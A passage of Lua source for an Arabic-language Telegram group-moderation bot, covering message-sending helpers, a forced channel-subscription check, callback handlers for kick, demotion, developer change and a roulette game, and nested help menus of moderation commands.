local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'سلطان التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "جدا حلوو" 
end 
return MsgText
end
--     Source David     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(David..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source David     --
function SourceCh(msg) 
local var = true 
if DevRio:get(David.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(David..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(David..'Rio:ChText') then
local ChText = DevRio:get(David..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(David.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*✧| عذرا لاتستطيع استخدام البوت !\n✧| عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
--     Source David     --
function ChCheck(msg)
local var = true 
if DevRio:get(David.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(David..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(David..'Rio:ChText') then
local ChText = DevRio:get(David..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(David.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*✧| عذرا لاتستطيع استخدام البوت !\n✧| عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
--     Source David     --
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevRio:get(David..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(David..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(David..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✧| لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "✧| ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "✧| البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "✧| لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "✧| تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevRio:get(David..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(David..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(David..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "✧| تم الغاء امر اطردني") 
end
--     Source David     --
if DataText == '/yesdel' and DevRio:get(David..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(David..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(David..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(David..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(David..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(David..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(David..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(David..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(David..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'الحمير • ' else donky = '' end
if DevRio:sismember(David..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(David..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(David..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(David..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(David..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(David..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(David..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(David..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(David..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(David..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(David..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(David..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "✧| تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "✧| ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "✧| لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevRio:get(David.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "✧| تم الغاء امر تغير المطور الاساسي") 
DevRio:del(David.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(David.."Rio:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "✧| المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n✧| تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"✧| بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n✧| لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
David = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevRio:del(David.."Rio:NewDev"..data.sender_user_id_)
dofile('David.lua') 
end
end
if DataText == '/nodel' and DevRio:get(David..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(David..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(David..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "✧| تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(David.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(David..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(David..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(David..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(David.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "✧| *صاحب الحظ* ↫ ["..UserName.."]\n✧| *مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(David..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(David.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(David.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "✧| تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevRio:smembers(David..'Rio:ListRolet'..data.chat_id_) 
local Text = '✧| قائمة الاعبين ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n' 
local Textt = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✧| تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevRio:sismember(David..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(David..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "✧| الكلمه ↫ "..Rio.." تم حذفها") 
DevRio:del(David..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(David..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(David..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(David..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✧| تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(David..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "✧| عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevRio:get(David..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✧| تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(David..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(David..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(David..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(David..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "✧| عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local Rio = DataText:match('/HideHelpList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✧| تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local Rio = DataText:match('/HelpList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(David..'Rio:Help')
local Text = [[
✧| اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| م1 ↫ اوامر الحمايه
✧| م2 ↫ اوامر الادمنيه
✧| م3 ↫ اوامر المدراء
✧| م4 ↫ اوامر المنشئين
✧| م5 ↫ اوامر المطورين
✧| م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local Rio = DataText:match('/HelpList1:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevRio:get(David..'Rio:Help1')
local Text = [[
✧| اوامر حماية المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| قفل • فتح ↫ الروابط
✧| قفل • فتح ↫ المعرفات
✧| قفل • فتح ↫ البوتات
✧| قفل • فتح ↫ المتحركه
✧| قفل • فتح ↫ الملصقات
✧| قفل • فتح ↫ الملفات
✧| قفل • فتح ↫ الصور
✧| قفل • فتح ↫ الفيديو
✧| قفل • فتح ↫ الاونلاين
✧| قفل • فتح ↫ الدردشه
✧| قفل • فتح ↫ التوجيه
✧| قفل • فتح ↫ الاغاني
✧| قفل • فتح ↫ الصوت
✧| قفل • فتح ↫ الجهات
✧| قفل • فتح ↫ الماركداون
✧| قفل • فتح ↫ التكرار
✧| قفل • فتح ↫ الهاشتاك
✧| قفل • فتح ↫ التعديل
✧| قفل • فتح ↫ التثبيت
✧| قفل • فتح ↫ الاشعارات
✧| قفل • فتح ↫ الكلايش
✧| قفل • فتح ↫ الدخول
✧| قفل • فتح ↫ الشبكات
✧| قفل • فتح ↫ المواقع
✧| قفل • فتح ↫ الفشار
✧| قفل • فتح ↫ الكفر
✧| قفل • فتح ↫ الطائفيه
✧| قفل • فتح ↫ الكل
✧| قفل • فتح ↫ العربيه
✧| قفل • فتح ↫ الانجليزيه
✧| قفل • فتح ↫ الفارسيه
✧| قفل • فتح ↫ التفليش
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| اوامر حمايه اخرى ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| قفل • فتح + الامر ↫ ⤈
✧| التكرار بالطرد
✧| التكرار بالكتم
✧| التكرار بالتقيد
✧| الفارسيه بالطرد
✧| البوتات بالطرد
✧| البوتات بالتقيد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local Rio = DataText:match('/HelpList2:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevRio:get(David..'Rio:Help2')
local Text = [[
✧| اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| الاعدادت
✧| تاك للكل 
✧| انشاء رابط
✧| ضع وصف
✧| ضع رابط
✧| ضع صوره
✧| حذف الرابط
✧| حذف الحمير
✧| كشف البوتات
✧| طرد البوتات
✧| تنظيف + العدد
✧| تنظيف التعديل
✧| قول + الكلمه
✧| اسم البوت + الامر
✧| ضع • حذف ↫ ترحيب
✧| ضع • حذف ↫ قوانين
✧| اضف • حذف ↫ صلاحيه
✧| الصلاحيات • حذف الصلاحيات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| ضع سبام + العدد
✧| ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| رفع مميز • تنزيل مميز
✧| المميزين • حذف المميزين
✧| كشف القيود • رفع القيود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| حذف • مسح + بالرد
✧| منع • الغاء منع
✧| قائمه المنع
✧| حذف قائمه المنع
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تفعيل • تعطيل ↫ الرابط
✧| تفعيل • تعطيل ↫ الالعاب
✧| تفعيل • تعطيل ↫ الترحيب
✧| تفعيل • تعطيل ↫ التاك للكل
✧| تفعيل • تعطيل ↫ كشف الاعدادات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| طرد المحذوفين
✧| طرد ↫ بالرد • بالمعرف • بالايدي
✧| كتم • الغاء كتم
✧| تقيد • الغاء تقيد
✧| حظر • الغاء حظر
✧| المكتومين • حذف المكتومين
✧| المقيدين • حذف المقيدين
✧| المحظورين • حذف المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تقييد دقيقه + عدد الدقائق
✧| تقييد ساعه + عدد الساعات
✧| تقييد يوم + عدد الايام
✧| الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local Rio = DataText:match('/HelpList3:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevRio:get(David..'Rio:Help3')
local Text = [[
✧| اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| فحص البوت
✧| ضع اسم + الاسم
✧| اضف • حذف ↫ رد
✧| ردود المدير
✧| حذف ردود المدير
✧| اضف • حذف ↫ رد متعدد
✧| حذف رد من متعدد
✧| الردود المتعدده
✧| حذف الردود المتعدده
✧| حذف قوائم المنع
✧| منع ↫ بالرد على ( ملصق • صوره • متحركه )
✧| حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تنزيل الكل
✧| رفع ادمن • تنزيل ادمن
✧| الادمنيه • حذف الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تثبيت
✧| الغاء التثبيت
✧| اعاده التثبيت
✧| الغاء تثبيت الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تغير رد + اسم الرتبه + النص ↫ ⤈
✧| المطور • منشئ الاساسي
✧| المنشئ • المدير • الادمن
✧| المميز • المنظف • العضو
✧| حذف ردود الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تغيير الايدي ↫ لتغيير الكليشه
✧| تعيين الايدي ↫ لتعيين الكليشه
✧| حذف الايدي ↫ لحذف الكليشه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تفعيل • تعطيل + الامر ↫ ⤈
✧| اطردني • الايدي بالصوره • الابراج
✧| معاني الاسماء • اوامر النسب • انطق
✧| الايدي • تحويل الصيغ • اوامر التحشيش
✧| ردود المدير • ردود المطور • التحقق
✧| ضافني • حساب العمر • الزخرفه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| [Source Channel](https://t.me/UUKXX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local Rio = DataText:match('/HelpList4:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("✧| عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevRio:get(David..'Rio:Help4')
local Text = [[
✧| اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✧| تنزيل الكل
✧| الميديا • امسح
✧| تعين عدد الحذف
✧| ترتيب الاوامر
✧| اضف • حذف ↫ امر
✧| حذف الاوامر المضافه
✧| الاوامر المضافه
